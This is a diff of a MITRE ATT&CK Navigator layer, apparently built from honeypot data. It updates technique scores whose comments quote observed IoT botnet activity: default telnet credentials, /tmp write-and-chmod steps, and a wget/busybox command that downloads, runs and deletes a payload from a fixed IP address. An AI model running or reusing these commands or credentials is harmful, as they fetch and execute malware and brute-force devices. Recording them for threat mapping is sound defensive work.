@@ -10,37 +10,37 @@
   "techniques": [
     {
       "techniqueID": "T1059.004",
-      "score": 1612,
+      "score": 1639,
       "comment": "shell; sh",
       "enabled": true
     },
     {
       "techniqueID": "T1110.001",
-      "score": 1050,
+      "score": 1055,
       "comment": "enable\\x00 / linuxshell\\x00; root / vizxv",
       "enabled": true
     },
     {
       "techniqueID": "T1222.002",
-      "score": 50,
+      "score": 66,
       "comment": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/; >/var/d && chmod 777 /var/d && /var/d && cd /var/",
       "enabled": true
     },
     {
       "techniqueID": "T1105",
-      "score": 28,
+      "score": 32,
       "comment": "Malformed transfer reference withheld; (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "enabled": true
     },
     {
       "techniqueID": "T1083",
-      "score": 25,
+      "score": 30,
       "comment": "cd /proc && cat self/cmdline; cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
       "enabled": true
     },
     {
       "techniqueID": "T1070.004",
-      "score": 23,
+      "score": 28,
       "comment": "rm /dev/.t; rm /dev/.sh; rm /dev/.human; (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
       "enabled": true
     },
@@ -70,6 +70,6 @@
       "#ff5d73"
     ],
     "minValue": 0,
-    "maxValue": 1612
+    "maxValue": 1639
   }
 }
